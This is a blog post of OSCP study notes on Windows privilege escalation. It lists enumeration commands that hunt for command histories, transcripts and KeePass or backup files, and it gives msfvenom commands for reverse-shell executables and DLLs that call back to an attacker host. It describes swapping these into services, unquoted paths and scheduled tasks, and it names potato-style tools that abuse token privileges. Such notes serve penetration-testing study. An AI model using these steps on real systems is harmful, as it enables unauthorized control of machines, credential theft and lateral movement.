---
author: "ZT"
title: Windows Privilege Escalation
description: "Common method of Windows Privilege Escalation"
image: WPE.png
date: 2023-11-03T16:31:42+02:00
categories:
    - Cybersecurity
    - StudyNotes
tags:
    - OSCP
    - PE
math: false
draft: false
---

## Introduction

**What is Privilege Escalation?** 

A **privilege escalation** is a cyberattack designed to gain unauthorized privileged access into a system. This not only make us able to access all resources on the system, but also closely related to lateral movement. We can dump other user's credential which saved in the system, so that we can use these credential to try to access other devices on the same intranet. Here I will show you same common method to make a privilege escalation on the Windows Operating System.

## Manual Enumeration (Information Gathering)

- `type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`: check user command history
- `whoami /priv`: check your permission
- `Get-ChildItem -Path C:\ -Include *.kdbx,*.zip,*backup* -File -Recurse -ErrorAction SilentlyContinue`: search key file
- `type C:\Users\Public\Transcripts\transcript01.txt`
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`: list all installed application
- Event Viewer: Check Script Block Logging
- `whoami /groups`: check my permission group
- `Get-Process`: list all running process
- `systeminfo`: check system version and try to find a kernel vulnerability
- `netstat -ano`: list all active connections

## Automated Enumeration (Information Gathering)

- [winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases)
- [Seatbelt](https://github.com/GhostPack/Seatbelt): `Seatbelt.exe -group=all`

## Service Binary Hijacking

**Service Binary Hijacking**

1. `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

2. Find out the service which is executed by administrator

3. We can use `icacls` to check if we have enough permission to overwrite the target executable file. Usage: `icacls "C:\path\to\program\program.exe"`

4. Generate your Trojan executable file (reverse shell): `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[local host] LPORT=[local port] -f exe -o reverse.exe`

5. Replace the target executable file with our Trojan file

6. `Restart-Service [service]`

## Service DLL Hijacking

1. Generate your payload dll (reverse shell)`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[local host] LPORT=[local port] -f dll -o payload.dll`

2. Start Procmon64.exe (RDP connection needed), find out the service which is executed by administrator
4. Find all dll which the target service used from Procmon64.exe
5. Replace the corresponded dll file with our Trojan dll
6. `Restart-Service [service which include this dll]`

## Unquoted Service Paths

- Find a service which run path contains spaces without quotes:
  - `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """` (execute in cmd terminal)
- Inject our Trojan file (generate by `msfvenom`)
- `Start-Service -Name "ServiceName"` (PowerShell)

## Scheduled Tasks

- Check scheduled task executable file's permission
  1. `schtasks /query /fo LIST /v | Select-String '(?i)TaskName|Next Run Time|Author|Run As User|Task To Run|^\s*$'`
  2. Check Permission: `icacls C:\Path\to\taget\<target>.exe`
  3. Replace it with your Trojan file (you can generate it by `msfvenom`)
- Wait it execute

## Using Exploits

1. Check permission: `whoami /priv`

2. Find **SeImpersonatePrivilege** permission

3. Use [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) / [GodPotato](https://github.com/BeichenDream/GodPotato)

4. Check .NET version: `Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version -ErrorAction SilentlyContinue | Where-Object { $_.Version -match '^\d+\.\d+' } | Select-Object PSChildName, Version`

5. GodPotato usage: `.\GodPotato-NET4.exe -cmd "cmd /c whoami"`

Others vulnerable permission: SeBackupPrivilege, SeAssignPrimaryToken, SeLoadDriver, and SeDebug

## By the way

Privilege escalation is very flexible, and the methods I introduced are only the most common ones. In a real case, you need to do the information gathering carefully, and try to exploit human behaviors, design flaws or oversights in operating systems or web applications. I recommend carefully checking the output information of **winpeas**, which often contains vulnerabilities that you can use to escalate privileges.
